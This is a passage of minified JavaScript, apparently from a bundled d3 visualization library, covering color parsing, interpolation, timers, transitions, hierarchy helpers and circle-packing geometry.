eblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};ro(Ds,Cs,{copy(e){return Object.assign(new this.constructor,this,e)},displayable(){return this.rgb().displayable()},hex:Oc,formatHex:Oc,formatHex8:y0,formatHsl:w0,formatRgb:jc,toString:jc});function Oc(){return this.rgb().formatHex()}function y0(){return this.rgb().formatHex8()}function w0(){return Bd(this).formatHsl()}function jc(){return this.rgb().formatRgb()}function Cs(e){var n,t;return e=(e+"").trim().toLowerCase(),(n=p0.exec(e))?(t=n[1].length,n=parseInt(n[1],16),t===6?Ic(n):t===3?new fe(n>>8&15|n>>4&240,n>>4&15|n&240,(n&15)<<4|n&15,1):t===8?sr(n>>24&255,n>>16&255,n>>8&255,(n&255)/255):t===4?sr(n>>12&15|n>>8&240,n>>8&15|n>>4&240,n>>4&15|n&240,((n&15)<<4|n&15)/255):null):(n=d0.exec(e))?new fe(n[1],n[2],n[3],1):(n=h0.exec(e))?new fe(n[1]*255/100,n[2]*255/100,n[3]*255/100,1):(n=f0.exec(e))?sr(n[1],n[2],n[3],n[4]):(n=m0.exec(e))?sr(n[1]*255/100,n[2]*255/100,n[3]*255/100,n[4]):(n=g0.exec(e))?zc(n[1],n[2]/100,n[3]/100,1):(n=v0.exec(e))?zc(n[1],n[2]/100,n[3]/100,n[4]):Rc.hasOwnProperty(e)?Ic(Rc[e]):e==="transparent"?new fe(NaN,NaN,NaN,0):null}function Ic(e){return new fe(e>>16&255,e>>8&255,e&255,1)}function sr(e,n,t,s){return s<=0&&(e=n=t=NaN),new fe(e,n,t,s)}function k0(e){return e instanceof Ds||(e=Cs(e)),e?(e=e.rgb(),new fe(e.r,e.g,e.b,e.opacity)):new fe}function Ja(e,n,t,s){return arguments.length===1?k0(e):new fe(e,n,t,s??1)}function fe(e,n,t,s){this.r=+e,this.g=+n,this.b=+t,this.opacity=+s}ro(fe,Ja,Fd(Ds,{brighter(e){return e=e==null?Xr:Math.pow(Xr,e),new fe(this.r*e,this.g*e,this.b*e,this.opacity)},darker(e){return e=e==null?Es:Math.pow(Es,e),new fe(this.r*e,this.g*e,this.b*e,this.opacity)},rgb(){return this},clamp(){return new fe($n(this.r),$n(this.g),$n(this.b),Kr(this.opacity))},displayable(){return-.5<=this.r&&this.r<255.5&&-.5<=this.g&&this.g<255.5&&-.5<=this.b&&this.b<255.5&&0<=this.opacity&&this.opacity<=1},hex:Mc,formatHex:Mc,formatHex8:b0,formatRgb:Dc,toString:Dc}));function Mc(){return`#${Un(this.r)}${Un(this.g)}${Un(this.b)}`}function b0(){return`#${Un(this.r)}${Un(this.g)}${Un(this.b)}${Un((isNaN(this.opacity)?1:this.opacity)*255)}`}function Dc(){const e=Kr(this.opacity);return`${e===1?"rgb(":"rgba("}${$n(this.r)}, ${$n(this.g)}, ${$n(this.b)}${e===1?")":`, ${e})`}`}function Kr(e){return isNaN(e)?1:Math.max(0,Math.min(1,e))}function $n(e){return Math.max(0,Math.min(255,Math.round(e)||0))}function Un(e){return e=$n(e),(e<16?"0":"")+e.toString(16)}function zc(e,n,t,s){return s<=0?e=n=t=NaN:t<=0||t>=1?e=n=NaN:n<=0&&(e=NaN),new je(e,n,t,s)}function Bd(e){if(e instanceof je)return new je(e.h,e.s,e.l,e.opacity);if(e instanceof Ds||(e=Cs(e)),!e)return new je;if(e instanceof je)return e;e=e.rgb();var n=e.r/255,t=e.g/255,s=e.b/255,r=Math.min(n,t,s),i=Math.max(n,t,s),a=NaN,l=i-r,o=(i+r)/2;return l?(n===i?a=(t-s)/l+(t<s)*6:t===i?a=(s-n)/l+2:a=(n-t)/l+4,l/=o<.5?i+r:2-i-r,a*=60):l=o>0&&o<1?0:a,new je(a,l,o,e.opacity)}function x0(e,n,t,s){return arguments.length===1?Bd(e):new je(e,n,t,s??1)}function je(e,n,t,s){this.h=+e,this.s=+n,this.l=+t,this.opacity=+s}ro(je,x0,Fd(Ds,{brighter(e){return e=e==null?Xr:Math.pow(Xr,e),new je(this.h,this.s,this.l*e,this.opacity)},darker(e){return e=e==null?Es:Math.pow(Es,e),new je(this.h,this.s,this.l*e,this.opacity)},rgb(){var e=this.h%360+(this.h<0)*360,n=isNaN(e)||isNaN(this.s)?0:this.s,t=this.l,s=t+(t<.5?t:1-t)*n,r=2*t-s;return new fe(Zi(e>=240?e-240:e+120,r,s),Zi(e,r,s),Zi(e<120?e+240:e-120,r,s),this.opacity)},clamp(){return new je(Fc(this.h),rr(this.s),rr(this.l),Kr(this.opacity))},displayable(){return(0<=this.s&&this.s<=1||isNaN(this.s))&&0<=this.l&&this.l<=1&&0<=this.opacity&&this.opacity<=1},formatHsl(){const e=Kr(this.opacity);return`${e===1?"hsl(":"hsla("}${Fc(this.h)}, ${rr(this.s)*100}%, ${rr(this.l)*100}%${e===1?")":`, ${e})`}`}}));function Fc(e){return e=(e||0)%360,e<0?e+360:e}function rr(e){return Math.max(0,Math.min(1,e||0))}function Zi(e,n,t){return(e<60?n+(t-n)*e/60:e<180?t:e<240?n+(t-n)*(240-e)/60:n)*255}const Ud=e=>()=>e;function S0(e,n){return function(t){return e+t*n}}function _0(e,n,t){return e=Math.pow(e,t),n=Math.pow(n,t)-e,t=1/t,function(s){return Math.pow(e+s*n,t)}}function E0(e){return(e=+e)==1?Hd:function(n,t){return t-n?_0(n,t,e):Ud(isNaN(n)?t:n)}}function Hd(e,n){var t=n-e;return t?S0(e,t):Ud(isNaN(e)?n:e)}const Bc=function e(n){var t=E0(n);function s(r,i){var a=t((r=Ja(r)).r,(i=Ja(i)).r),l=t(r.g,i.g),o=t(r.b,i.b),c=Hd(r.opacity,i.opacity);return function(p){return r.r=a(p),r.g=l(p),r.b=o(p),r.opacity=c(p),r+""}}return s.gamma=e,s}(1);function hn(e,n){return e=+e,n=+n,function(t){return e*(1-t)+n*t}}var el=/[-+]?(?:\d+\.?\d*|\.?\d+)(?:[eE][-+]?\d+)?/g,Ji=new RegExp(el.source,"g");function T0(e){return function(){return e}}function C0(e){return function(n){return e(n)+""}}function N0(e,n){var t=el.lastIndex=Ji.lastIndex=0,s,r,i,a=-1,l=[],o=[];for(e=e+"",n=n+"";(s=el.exec(e))&&(r=Ji.exec(n));)(i=r.index)>t&&(i=n.slice(t,i),l[a]?l[a]+=i:l[++a]=i),(s=s[0])===(r=r[0])?l[a]?l[a]+=r:l[++a]=r:(l[++a]=null,o.push({i:a,x:hn(s,r)})),t=Ji.lastIndex;return t<n.length&&(i=n.slice(t),l[a]?l[a]+=i:l[++a]=i),l.length<2?o[0]?C0(o[0].x):T0(n):(n=o.length,function(c){for(var p=0,d;p<n;++p)l[(d=o[p]).i]=d.x(c);return l.join("")})}var Uc=180/Math.PI,nl={translateX:0,translateY:0,rotate:0,skewX:0,scaleX:1,scaleY:1};function Vd(e,n,t,s,r,i){var a,l,o;return(a=Math.sqrt(e*e+n*n))&&(e/=a,n/=a),(o=e*t+n*s)&&(t-=e*o,s-=n*o),(l=Math.sqrt(t*t+s*s))&&(t/=l,s/=l,o/=l),e*s<n*t&&(e=-e,n=-n,o=-o,a=-a),{translateX:r,translateY:i,rotate:Math.atan2(n,e)*Uc,skewX:Math.atan(o)*Uc,scaleX:a,scaleY:l}}var ir;function A0(e){const n=new(typeof DOMMatrix=="function"?DOMMatrix:WebKitCSSMatrix)(e+"");return n.isIdentity?nl:Vd(n.a,n.b,n.c,n.d,n.e,n.f)}function P0(e){return e==null||(ir||(ir=document.createElementNS("http://www.w3.org/2000/svg","g")),ir.setAttribute("transform",e),!(e=ir.transform.baseVal.consolidate()))?nl:(e=e.matrix,Vd(e.a,e.b,e.c,e.d,e.e,e.f))}function Wd(e,n,t,s){function r(c){return c.length?c.pop()+" ":""}function i(c,p,d,h,v,y){if(c!==d||p!==h){var w=v.push("translate(",null,n,null,t);y.push({i:w-4,x:hn(c,d)},{i:w-2,x:hn(p,h)})}else(d||h)&&v.push("translate("+d+n+h+t)}function a(c,p,d,h){c!==p?(c-p>180?p+=360:p-c>180&&(c+=360),h.push({i:d.push(r(d)+"rotate(",null,s)-2,x:hn(c,p)})):p&&d.push(r(d)+"rotate("+p+s)}function l(c,p,d,h){c!==p?h.push({i:d.push(r(d)+"skewX(",null,s)-2,x:hn(c,p)}):p&&d.push(r(d)+"skewX("+p+s)}function o(c,p,d,h,v,y){if(c!==d||p!==h){var w=v.push(r(v)+"scale(",null,",",null,")");y.push({i:w-4,x:hn(c,d)},{i:w-2,x:hn(p,h)})}else(d!==1||h!==1)&&v.push(r(v)+"scale("+d+","+h+")")}return function(c,p){var d=[],h=[];return c=e(c),p=e(p),i(c.translateX,c.translateY,p.translateX,p.translateY,d,h),a(c.rotate,p.rotate,d,h),l(c.skewX,p.skewX,d,h),o(c.scaleX,c.scaleY,p.scaleX,p.scaleY,d,h),c=p=null,function(v){for(var y=-1,w=h.length,x;++y<w;)d[(x=h[y]).i]=x.x(v);return d.join("")}}}var L0=Wd(A0,"px, ","px)","deg)"),R0=Wd(P0,", ",")",")"),At=0,Yt=0,Ht=0,$d=1e3,Qr,qt,Zr=0,Qn=0,ki=0,Ns=typeof performance=="object"&&performance.now?performance:Date,Gd=typeof window=="object"&&window.requestAnimationFrame?window.requestAnimationFrame.bind(window):function(e){setTimeout(e,17)};function io(){return Qn||(Gd(O0),Qn=Ns.now()+ki)}function O0(){Qn=0}function Jr(){this._call=this._time=this._next=null}Jr.prototype=Yd.prototype={constructor:Jr,restart:function(e,n,t){if(typeof e!="function")throw new TypeError("callback is not a function");t=(t==null?io():+t)+(n==null?0:+n),!this._next&&qt!==this&&(qt?qt._next=this:Qr=this,qt=this),this._call=e,this._time=t,tl()},stop:function(){this._call&&(this._call=null,this._time=1/0,tl())}};function Yd(e,n,t){var s=new Jr;return s.restart(e,n,t),s}function j0(){io(),++At;for(var e=Qr,n;e;)(n=Qn-e._time)>=0&&e._call.call(void 0,n),e=e._next;--At}function Hc(){Qn=(Zr=Ns.now())+ki,At=Yt=0;try{j0()}finally{At=0,M0(),Qn=0}}function I0(){var e=Ns.now(),n=e-Zr;n>$d&&(ki-=n,Zr=e)}function M0(){for(var e,n=Qr,t,s=1/0;n;)n._call?(s>n._time&&(s=n._time),e=n,n=n._next):(t=n._next,n._next=null,n=e?e._next=t:Qr=t);qt=e,tl(s)}function tl(e){if(!At){Yt&&(Yt=clearTimeout(Yt));var n=e-Qn;n>24?(e<1/0&&(Yt=setTimeout(Hc,e-Ns.now()-ki)),Ht&&(Ht=clearInterval(Ht))):(Ht||(Zr=Ns.now(),Ht=setInterval(I0,$d)),At=1,Gd(Hc))}}function Vc(e,n,t){var s=new Jr;return n=n==null?0:+n,s.restart(r=>{s.stop(),e(r+n)},n,t),s}var D0=Cd("start","end","cancel","interrupt"),z0=[],qd=0,Wc=1,sl=2,br=3,$c=4,rl=5,xr=6;function bi(e,n,t,s,r,i){var a=e.__transition;if(!a)e.__transition={};else if(t in a)return;F0(e,t,{name:n,index:s,group:r,on:D0,tween:z0,time:i.time,delay:i.delay,duration:i.duration,ease:i.ease,timer:null,state:qd})}function ao(e,n){var t=Be(e,n);if(t.state>qd)throw new Error("too late; already scheduled");return t}function Ye(e,n){var t=Be(e,n);if(t.state>br)throw new Error("too late; already running");return t}function Be(e,n){var t=e.__transition;if(!t||!(t=t[n]))throw new Error("transition not found");return t}function F0(e,n,t){var s=e.__transition,r;s[n]=t,t.timer=Yd(i,0,t.time);function i(c){t.state=Wc,t.timer.restart(a,t.delay,t.time),t.delay<=c&&a(c-t.delay)}function a(c){var p,d,h,v;if(t.state!==Wc)return o();for(p in s)if(v=s[p],v.name===t.name){if(v.state===br)return Vc(a);v.state===$c?(v.state=xr,v.timer.stop(),v.on.call("interrupt",e,e.__data__,v.index,v.group),delete s[p]):+p<n&&(v.state=xr,v.timer.stop(),v.on.call("cancel",e,e.__data__,v.index,v.group),delete s[p])}if(Vc(function(){t.state===br&&(t.state=$c,t.timer.restart(l,t.delay,t.time),l(c))}),t.state=sl,t.on.call("start",e,e.__data__,t.index,t.group),t.state===sl){for(t.state=br,r=new Array(h=t.tween.length),p=0,d=-1;p<h;++p)(v=t.tween[p].value.call(e,e.__data__,t.index,t.group))&&(r[++d]=v);r.length=d+1}}function l(c){for(var p=c<t.duration?t.ease.call(null,c/t.duration):(t.timer.restart(o),t.state=rl,1),d=-1,h=r.length;++d<h;)r[d].call(e,p);t.state===rl&&(t.on.call("end",e,e.__data__,t.index,t.group),o())}function o(){t.state=xr,t.timer.stop(),delete s[n];for(var c in s)return;delete e.__transition}}function B0(e,n){var t=e.__transition,s,r,i=!0,a;if(t){n=n==null?null:n+"";for(a in t){if((s=t[a]).name!==n){i=!1;continue}r=s.state>sl&&s.state<rl,s.state=xr,s.timer.stop(),s.on.call(r?"interrupt":"cancel",e,e.__data__,s.index,s.group),delete t[a]}i&&delete e.__transition}}function U0(e){return this.each(function(){B0(this,e)})}function H0(e,n){var t,s;return function(){var r=Ye(this,e),i=r.tween;if(i!==t){s=t=i;for(var a=0,l=s.length;a<l;++a)if(s[a].name===n){s=s.slice(),s.splice(a,1);break}}r.tween=s}}function V0(e,n,t){var s,r;if(typeof t!="function")throw new Error;return function(){var i=Ye(this,e),a=i.tween;if(a!==s){r=(s=a).slice();for(var l={name:n,value:t},o=0,c=r.length;o<c;++o)if(r[o].name===n){r[o]=l;break}o===c&&r.push(l)}i.tween=r}}function W0(e,n){var t=this._id;if(e+="",arguments.length<2){for(var s=Be(this.node(),t).tween,r=0,i=s.length,a;r<i;++r)if((a=s[r]).name===e)return a.value;return null}return this.each((n==null?H0:V0)(t,e,n))}function lo(e,n,t){var s=e._id;return e.each(function(){var r=Ye(this,s);(r.value||(r.value={}))[n]=t.apply(this,arguments)}),function(r){return Be(r,s).value[n]}}function Xd(e,n){var t;return(typeof n=="number"?hn:n instanceof Cs?Bc:(t=Cs(n))?(n=t,Bc):N0)(e,n)}function $0(e){return function(){this.removeAttribute(e)}}function G0(e){return function(){this.removeAttributeNS(e.space,e.local)}}function Y0(e,n,t){var s,r=t+"",i;return function(){var a=this.getAttribute(e);return a===r?null:a===s?i:i=n(s=a,t)}}function q0(e,n,t){var s,r=t+"",i;return function(){var a=this.getAttributeNS(e.space,e.local);return a===r?null:a===s?i:i=n(s=a,t)}}function X0(e,n,t){var s,r,i;return function(){var a,l=t(this),o;return l==null?void this.removeAttribute(e):(a=this.getAttribute(e),o=l+"",a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l)))}}function K0(e,n,t){var s,r,i;return function(){var a,l=t(this),o;return l==null?void this.removeAttributeNS(e.space,e.local):(a=this.getAttributeNS(e.space,e.local),o=l+"",a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l)))}}function Q0(e,n){var t=wi(e),s=t==="transform"?R0:Xd;return this.attrTween(e,typeof n=="function"?(t.local?K0:X0)(t,s,lo(this,"attr."+e,n)):n==null?(t.local?G0:$0)(t):(t.local?q0:Y0)(t,s,n))}function Z0(e,n){return function(t){this.setAttribute(e,n.call(this,t))}}function J0(e,n){return function(t){this.setAttributeNS(e.space,e.local,n.call(this,t))}}function ew(e,n){var t,s;function r(){var i=n.apply(this,arguments);return i!==s&&(t=(s=i)&&J0(e,i)),t}return r._value=n,r}function nw(e,n){var t,s;function r(){var i=n.apply(this,arguments);return i!==s&&(t=(s=i)&&Z0(e,i)),t}return r._value=n,r}function tw(e,n){var t="attr."+e;if(arguments.length<2)return(t=this.tween(t))&&t._value;if(n==null)return this.tween(t,null);if(typeof n!="function")throw new Error;var s=wi(e);return this.tween(t,(s.local?ew:nw)(s,n))}function sw(e,n){return function(){ao(this,e).delay=+n.apply(this,arguments)}}function rw(e,n){return n=+n,function(){ao(this,e).delay=n}}function iw(e){var n=this._id;return arguments.length?this.each((typeof e=="function"?sw:rw)(n,e)):Be(this.node(),n).delay}function aw(e,n){return function(){Ye(this,e).duration=+n.apply(this,arguments)}}function lw(e,n){return n=+n,function(){Ye(this,e).duration=n}}function ow(e){var n=this._id;return arguments.length?this.each((typeof e=="function"?aw:lw)(n,e)):Be(this.node(),n).duration}function cw(e,n){if(typeof n!="function")throw new Error;return function(){Ye(this,e).ease=n}}function uw(e){var n=this._id;return arguments.length?this.each(cw(n,e)):Be(this.node(),n).ease}function pw(e,n){return function(){var t=n.apply(this,arguments);if(typeof t!="function")throw new Error;Ye(this,e).ease=t}}function dw(e){if(typeof e!="function")throw new Error;return this.each(pw(this._id,e))}function hw(e){typeof e!="function"&&(e=Pd(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=[],o,c=0;c<a;++c)(o=i[c])&&e.call(o,o.__data__,c,i)&&l.push(o);return new an(s,this._parents,this._name,this._id)}function fw(e){if(e._id!==this._id)throw new Error;for(var n=this._groups,t=e._groups,s=n.length,r=t.length,i=Math.min(s,r),a=new Array(s),l=0;l<i;++l)for(var o=n[l],c=t[l],p=o.length,d=a[l]=new Array(p),h,v=0;v<p;++v)(h=o[v]||c[v])&&(d[v]=h);for(;l<s;++l)a[l]=n[l];return new an(a,this._parents,this._name,this._id)}function mw(e){return(e+"").trim().split(/^|\s+/).every(function(n){var t=n.indexOf(".");return t>=0&&(n=n.slice(0,t)),!n||n==="start"})}function gw(e,n,t){var s,r,i=mw(n)?ao:Ye;return function(){var a=i(this,e),l=a.on;l!==s&&(r=(s=l).copy()).on(n,t),a.on=r}}function vw(e,n){var t=this._id;return arguments.length<2?Be(this.node(),t).on.on(e):this.each(gw(t,e,n))}function yw(e){return function(){var n=this.parentNode;for(var t in this.__transition)if(+t!==e)return;n&&n.removeChild(this)}}function ww(){return this.on("end.remove",yw(this._id))}function kw(e){var n=this._name,t=this._id;typeof e!="function"&&(e=to(e));for(var s=this._groups,r=s.length,i=new Array(r),a=0;a<r;++a)for(var l=s[a],o=l.length,c=i[a]=new Array(o),p,d,h=0;h<o;++h)(p=l[h])&&(d=e.call(p,p.__data__,h,l))&&("__data__"in p&&(d.__data__=p.__data__),c[h]=d,bi(c[h],n,t,h,c,Be(p,t)));return new an(i,this._parents,n,t)}function bw(e){var n=this._name,t=this._id;typeof e!="function"&&(e=Ad(e));for(var s=this._groups,r=s.length,i=[],a=[],l=0;l<r;++l)for(var o=s[l],c=o.length,p,d=0;d<c;++d)if(p=o[d]){for(var h=e.call(p,p.__data__,d,o),v,y=Be(p,t),w=0,x=h.length;w<x;++w)(v=h[w])&&bi(v,n,t,w,h,y);i.push(h),a.push(p)}return new an(i,a,n,t)}var xw=Ms.prototype.constructor;function Sw(){return new xw(this._groups,this._parents)}function _w(e,n){var t,s,r;return function(){var i=Nt(this,e),a=(this.style.removeProperty(e),Nt(this,e));return i===a?null:i===t&&a===s?r:r=n(t=i,s=a)}}function Kd(e){return function(){this.style.removeProperty(e)}}function Ew(e,n,t){var s,r=t+"",i;return function(){var a=Nt(this,e);return a===r?null:a===s?i:i=n(s=a,t)}}function Tw(e,n,t){var s,r,i;return function(){var a=Nt(this,e),l=t(this),o=l+"";return l==null&&(o=l=(this.style.removeProperty(e),Nt(this,e))),a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l))}}function Cw(e,n){var t,s,r,i="style."+n,a="end."+i,l;return function(){var o=Ye(this,e),c=o.on,p=o.value[i]==null?l||(l=Kd(n)):void 0;(c!==t||r!==p)&&(s=(t=c).copy()).on(a,r=p),o.on=s}}function Nw(e,n,t){var s=(e+="")=="transform"?L0:Xd;return n==null?this.styleTween(e,_w(e,s)).on("end.style."+e,Kd(e)):typeof n=="function"?this.styleTween(e,Tw(e,s,lo(this,"style."+e,n))).each(Cw(this._id,e)):this.styleTween(e,Ew(e,s,n),t).on("end.style."+e,null)}function Aw(e,n,t){return function(s){this.style.setProperty(e,n.call(this,s),t)}}function Pw(e,n,t){var s,r;function i(){var a=n.apply(this,arguments);return a!==r&&(s=(r=a)&&Aw(e,a,t)),s}return i._value=n,i}function Lw(e,n,t){var s="style."+(e+="");if(arguments.length<2)return(s=this.tween(s))&&s._value;if(n==null)return this.tween(s,null);if(typeof n!="function")throw new Error;return this.tween(s,Pw(e,n,t??""))}function Rw(e){return function(){this.textContent=e}}function Ow(e){return function(){var n=e(this);this.textContent=n??""}}function jw(e){return this.tween("text",typeof e=="function"?Ow(lo(this,"text",e)):Rw(e==null?"":e+""))}function Iw(e){return function(n){this.textContent=e.call(this,n)}}function Mw(e){var n,t;function s(){var r=e.apply(this,arguments);return r!==t&&(n=(t=r)&&Iw(r)),n}return s._value=e,s}function Dw(e){var n="text";if(arguments.length<1)return(n=this.tween(n))&&n._value;if(e==null)return this.tween(n,null);if(typeof e!="function")throw new Error;return this.tween(n,Mw(e))}function zw(){for(var e=this._name,n=this._id,t=Qd(),s=this._groups,r=s.length,i=0;i<r;++i)for(var a=s[i],l=a.length,o,c=0;c<l;++c)if(o=a[c]){var p=Be(o,n);bi(o,e,t,c,a,{time:p.time+p.delay+p.duration,delay:0,duration:p.duration,ease:p.ease})}return new an(s,this._parents,e,t)}function Fw(){var e,n,t=this,s=t._id,r=t.size();return new Promise(function(i,a){var l={value:a},o={value:function(){--r===0&&i()}};t.each(function(){var c=Ye(this,s),p=c.on;p!==e&&(n=(e=p).copy(),n._.cancel.push(l),n._.interrupt.push(l),n._.end.push(o)),c.on=n}),r===0&&i()})}var Bw=0;function an(e,n,t,s){this._groups=e,this._parents=n,this._name=t,this._id=s}function Qd(){return++Bw}var Xe=Ms.prototype;an.prototype={constructor:an,select:kw,selectAll:bw,selectChild:Xe.selectChild,selectChildren:Xe.selectChildren,filter:hw,merge:fw,selection:Sw,transition:zw,call:Xe.call,nodes:Xe.nodes,node:Xe.node,size:Xe.size,empty:Xe.empty,each:Xe.each,on:vw,attr:Q0,attrTween:tw,style:Nw,styleTween:Lw,text:jw,textTween:Dw,remove:ww,tween:W0,delay:iw,duration:ow,ease:uw,easeVarying:dw,end:Fw,[Symbol.iterator]:Xe[Symbol.iterator]};function Uw(e){return((e*=2)<=1?e*e*e:(e-=2)*e*e+2)/2}var Hw={time:null,delay:0,duration:250,ease:Uw};function Vw(e,n){for(var t;!(t=e.__transition)||!(t=t[n]);)if(!(e=e.parentNode))throw new Error(`transition ${n} not found`);return t}function Ww(e){var n,t;e instanceof an?(n=e._id,e=e._name):(n=Qd(),(t=Hw).time=io(),e=e==null?null:e+"");for(var s=this._groups,r=s.length,i=0;i<r;++i)for(var a=s[i],l=a.length,o,c=0;c<l;++c)(o=a[c])&&bi(o,e,n,c,a,t||Vw(o,n));return new an(s,this._parents,e,n)}Ms.prototype.interrupt=U0;Ms.prototype.transition=Ww;function $w(e){var n=0,t=e.children,s=t&&t.length;if(!s)n=1;else for(;--s>=0;)n+=t[s].value;e.value=n}function Gw(){return this.eachAfter($w)}function Yw(e,n){let t=-1;for(const s of this)e.call(n,s,++t,this);return this}function qw(e,n){for(var t=this,s=[t],r,i,a=-1;t=s.pop();)if(e.call(n,t,++a,this),r=t.children)for(i=r.length-1;i>=0;--i)s.push(r[i]);return this}function Xw(e,n){for(var t=this,s=[t],r=[],i,a,l,o=-1;t=s.pop();)if(r.push(t),i=t.children)for(a=0,l=i.length;a<l;++a)s.push(i[a]);for(;t=r.pop();)e.call(n,t,++o,this);return this}function Kw(e,n){let t=-1;for(const s of this)if(e.call(n,s,++t,this))return s}function Qw(e){return this.eachAfter(function(n){for(var t=+e(n.data)||0,s=n.children,r=s&&s.length;--r>=0;)t+=s[r].value;n.value=t})}function Zw(e){return this.eachBefore(function(n){n.children&&n.children.sort(e)})}function Jw(e){for(var n=this,t=e1(n,e),s=[n];n!==t;)n=n.parent,s.push(n);for(var r=s.length;e!==t;)s.splice(r,0,e),e=e.parent;return s}function e1(e,n){if(e===n)return e;var t=e.ancestors(),s=n.ancestors(),r=null;for(e=t.pop(),n=s.pop();e===n;)r=e,e=t.pop(),n=s.pop();return r}function n1(){for(var e=this,n=[e];e=e.parent;)n.push(e);return n}function t1(){return Array.from(this)}function s1(){var e=[];return this.eachBefore(function(n){n.children||e.push(n)}),e}function r1(){var e=this,n=[];return e.each(function(t){t!==e&&n.push({source:t.parent,target:t})}),n}function*i1(){var e=this,n,t=[e],s,r,i;do for(n=t.reverse(),t=[];e=n.pop();)if(yield e,s=e.children)for(r=0,i=s.length;r<i;++r)t.push(s[r]);while(t.length)}function oo(e,n){e instanceof Map?(e=[void 0,e],n===void 0&&(n=o1)):n===void 0&&(n=l1);for(var t=new ei(e),s,r=[t],i,a,l,o;s=r.pop();)if((a=n(s.data))&&(o=(a=Array.from(a)).length))for(s.children=a,l=o-1;l>=0;--l)r.push(i=a[l]=new ei(a[l])),i.parent=s,i.depth=s.depth+1;return t.eachBefore(u1)}function a1(){return oo(this).eachBefore(c1)}function l1(e){return e.children}function o1(e){return Array.isArray(e)?e[1]:null}function c1(e){e.data.value!==void 0&&(e.value=e.data.value),e.data=e.data.data}function u1(e){var n=0;do e.height=n;while((e=e.parent)&&e.height<++n)}function ei(e){this.data=e,this.depth=this.height=0,this.parent=null}ei.prototype=oo.prototype={constructor:ei,count:Gw,each:Yw,eachAfter:Xw,eachBefore:qw,find:Kw,sum:Qw,sort:Zw,path:Jw,ancestors:n1,descendants:t1,leaves:s1,links:r1,copy:a1,[Symbol.iterator]:i1};function p1(e){return e==null?null:d1(e)}function d1(e){if(typeof e!="function")throw new Error;return e}function Gc(){return 0}function h1(e){return function(){return e}}const f1=1664525,m1=1013904223,Yc=4294967296;function g1(){let e=1;return()=>(e=(f1*e+m1)%Yc)/Yc}function v1(e){return typeof e=="object"&&"length"in e?e:Array.from(e)}function y1(e,n){let t=e.length,s,r;for(;t;)r=n()*t--|0,s=e[t],e[t]=e[r],e[r]=s;return e}function w1(e,n){for(var t=0,s=(e=y1(Array.from(e),n)).length,r=[],i,a;t<s;)i=e[t],a&&Zd(a,i)?++t:(a=b1(r=k1(r,i)),t=0);return a}function k1(e,n){var t,s;if(ea(n,e))return[n];for(t=0;t<e.length;++t)if(ar(n,e[t])&&ea(Xt(e[t],n),e))return[e[t],n];for(t=0;t<e.length-1;++t)for(s=t+1;s<e.length;++s)if(ar(Xt(e[t],e[s]),n)&&ar(Xt(e[t],n),e[s])&&ar(Xt(e[s],n),e[t])&&ea(Jd(e[t],e[s],n),e))return[e[t],e[s],n];throw new Error}function ar(e,n){var t=e.r-n.r,s=n.x-e.x,r=n.y-e.y;return t<0||t*t<s*s+r*r}function Zd(e,n){var t=e.r-n.r+Math.max(e.r,n.r,1)*1e-9,s=n.x-e.x,r=n.y-e.y;return t>0&&t*t>s*s+r*r}function ea(e,n){for(var t=0;t<n.length;++t)if(!Zd(e,n[t]))return!1;return!0}function b1(e){switch(e.length){case 1:return x1(e[0]);case 2:return Xt(e[0],e[1]);case 3:return Jd(e[0],e[1],e[2])}}function x1(e){return{x:e.x,y:e.y,r:e.r}}function Xt(e,n){var t=e.x,s=e.y,r=e.r,i=n.x,a=n.y,l=n.r,o=i-t,c=a-s,p=l-r,d=Math.sqrt(o*o+c*c);return{x:(t+i+o/d*p)/2,y:(s+a+c/d*p)/2,r:(d+r+l)/2}}function Jd(e,n,t){var s=e.x,r=e.y,i=e.r,a=n.x,l=n.y,o=n.r,c=t.x,p=t.y,d=t.r,h=s-a,v=s-c,y=r-l,w=r-p,x=o-i,m=d-i,f=s*s+r*r-i*i,g=f-a*a-l*l+o*o,k=f-c*c-p*p+d*d,_=v*y-h*w,T=(y*k-w*g)/(_*2)-s,C=(w*x-y*m)/_,E=(v*g-h*k)/(_*2)-r,I=(h*m-v*x)/_,P=C*C+I*I-1,se=2*(i+T*C+E*I),on=T*T+E*E-i*i,qe=-(Math.abs(P)>1e-6?(se+Math.sqrt(se*se-4*P*on))/(2*P):on/se);return{x:s+T+C*qe,y:r+E+I*qe,r:qe}}function qc(e,n,t){var s=e.x-n.x,r,i,a=e.y-n.y,l,o,c=s*s+a*a;c?(i=n.r+t.r,i*=i,o=e.r+t.r,o*=o,i>o?(r=(c+o-i)/(2*c),l=Math.sqrt(Math.max(0,o/c-r*r)),t.x=e.x-r*s-l*a,t.y=e.y-r*a+l*s):(r=(c+i-o)/(2*c),l=Math.sqrt(Math.max(0,i/c-r*r)),t.x=n.x+r*s-l*a,t.y=n.y+r*a+l*s)):(t.x=n.x+t.r,t.y=n.y)}function Xc(e,n){var t=e.r+n.r-1e-6,s=n.x-e.x,r=n.y-e.y;return t>0&&t*t>s*s+r*r}function Kc(e){var n=e._,t=e.next._,s=n.r+t.r,r=(n.x*t.r+t.x*n.r)/s,i=(n.y*t.r+t.y*n.r)/s;return r*r+i*i}function lr(e){this._=e,this.next=null,this.previous=null}function S1(e,n){if(!(i=(e=v1(e)).length))return 0;var t,s,r,i,a,l,o,c,p,d,h;if(t=e[0],t.x=0,t.y=0,!(i>1))return 